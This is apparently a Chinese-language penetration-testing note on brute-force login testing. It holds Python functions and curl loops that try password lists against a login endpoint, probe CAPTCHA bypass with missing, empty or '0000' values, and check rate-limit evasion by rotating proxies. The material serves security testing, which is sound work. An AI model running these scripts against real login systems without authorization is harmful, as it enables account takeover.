# 暴力破解测试

## 测试方法

### 1. 无验证码登录

```python
def test_no_captcha_login(url, username, password_list):
    """
    测试无验证码的登录接口
    """
    for password in password_list:
        r = requests.post(url, json={
            "username": username,
            "password": password
        })
        
        # 检查是否成功
        if r.status_code == 200 and "token" in r.text:
            return {
                "vuln": True,
                "type": "暴力破解",
                "detail": f"密码{password}破解成功"
            }
        
        # 检查是否被限制
        if "locked" in r.text.lower() or "too many" in r.text.lower():
            return {
                "vuln": False,
                "reason": "登录被限制"
            }
    
    return {"vuln": False}
```

### 2. 验证码可绕过

```python
def test_captcha_bypass(url):
    """
    测试验证码是否可被绕过
    """
    # 测试不发送验证码参数
    r1 = requests.post(url, json={
        "username": "admin",
        "password": "test",
        # 不发送captcha参数
    })
    
    # 测试空验证码
    r2 = requests.post(url, json={
        "username": "admin",
        "password": "test",
        "captcha": ""
    })
    
    # 测试万能验证码
    r3 = requests.post(url, json={
        "username": "admin",
        "password": "test",
        "captcha": "0000"
    })
    
    if r1.status_code == 200 or r2.status_code == 200 or r3.status_code == 200:
        if "token" in r1.text or "token" in r2.text or "token" in r3.text:
            return {"vuln": True, "type": "验证码可绕过"}
    
    return {"vuln": False}
```

### 3. 限流绕过

```python
def test_rate_limit_bypass(url):
    """
    测试限流是否可被绕过
    """
    # 方法1: 更换IP
    proxies = [
        {"http": "http://proxy1:8080"},
        {"http": "http://proxy2:8080"},
    ]
    
    # 方法2: 延时绕过
    for i in range(10):
        r = requests.post(url, json={"username": f"user{i}"})
        if "rate" in r.text.lower() or "limit" in r.text.lower():
            return {"vuln": False, "reason": "限流生效"}
        time.sleep(1)
    
    return {"vuln": True, "type": "限流可绕过"}
```

## 测试场景

```bash
# 测试登录接口
curl -X POST "http://api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"123456"}'

# 多次尝试
for p in 0000 1111 2222 3333 4444; do
  curl -X POST "http://api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$p\"}"
done
```
